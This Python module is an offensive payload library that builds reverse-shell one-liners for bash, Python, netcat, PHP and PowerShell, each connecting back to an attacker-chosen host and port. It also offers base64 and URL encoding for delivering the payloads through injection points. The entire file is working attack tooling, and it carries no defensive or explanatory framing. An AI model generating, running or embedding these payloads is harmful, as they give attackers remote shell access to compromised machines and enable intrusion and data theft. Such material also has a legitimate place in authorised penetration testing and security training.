"""Payload template library.

Generates reverse-shell payloads for bash, python, nc, php, ps1.
Supports none / base64 / url encoding.

Example:
    cfg = PayloadConfig(type=PayloadType.BASH, lhost="10.10.14.5", lport=4444)
    raw = generate(cfg)

    cfg_enc = PayloadConfig(..., encoding=Encoding.BASE64)
    encoded = generate(cfg_enc)
"""

from __future__ import annotations

import base64
import enum
import urllib.parse
from dataclasses import dataclass


class PayloadType(str, enum.Enum):
    BASH = "bash"
    PYTHON = "python"
    NC = "nc"
    PHP = "php"
    PS1 = "ps1"


class Encoding(str, enum.Enum):
    NONE = "none"
    BASE64 = "base64"
    URL = "url"


@dataclass
class PayloadConfig:
    type: PayloadType
    lhost: str
    lport: int
    encoding: Encoding = Encoding.NONE


# ---------------------------------------------------------------------------
# Templates (raw, before encoding)
# ---------------------------------------------------------------------------

def _bash(lhost: str, lport: int) -> str:
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"


def _python(lhost: str, lport: int) -> str:
    return (
        "python3 -c '"
        "import socket,os,pty;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
        "pty.spawn(\"/bin/sh\")'"
    )


def _nc(lhost: str, lport: int) -> str:
    return f"nc -e /bin/sh {lhost} {lport}"


def _php(lhost: str, lport: int) -> str:
    return (
        "<?php "
        "$sock=fsockopen(\"{lhost}\",{lport});"
        "exec(\"/bin/sh -i <&3 >&3 2>&3\");"
        "?>"
    ).format(lhost=lhost, lport=lport)


def _ps1(lhost: str, lport: int) -> str:
    return (
        "$client = New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{{0}};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String);"
        "$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}};"
        "$client.Close()"
    ).format(lhost=lhost, lport=lport)


_GENERATORS = {
    PayloadType.BASH: _bash,
    PayloadType.PYTHON: _python,
    PayloadType.NC: _nc,
    PayloadType.PHP: _php,
    PayloadType.PS1: _ps1,
}


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

def generate(cfg: PayloadConfig) -> str:
    """Generate a payload string from cfg. Raises ValueError on bad inputs."""
    if not cfg.lhost:
        raise ValueError("lhost must not be empty")
    if not (1 <= cfg.lport <= 65535):
        raise ValueError(f"lport {cfg.lport!r} is out of range 1-65535")

    raw = _GENERATORS[cfg.type](cfg.lhost, cfg.lport)

    if cfg.encoding == Encoding.NONE:
        return raw
    elif cfg.encoding == Encoding.BASE64:
        return base64.b64encode(raw.encode("utf-8")).decode("ascii")
    elif cfg.encoding == Encoding.URL:
        return urllib.parse.quote(raw, safe="")
    else:
        return raw
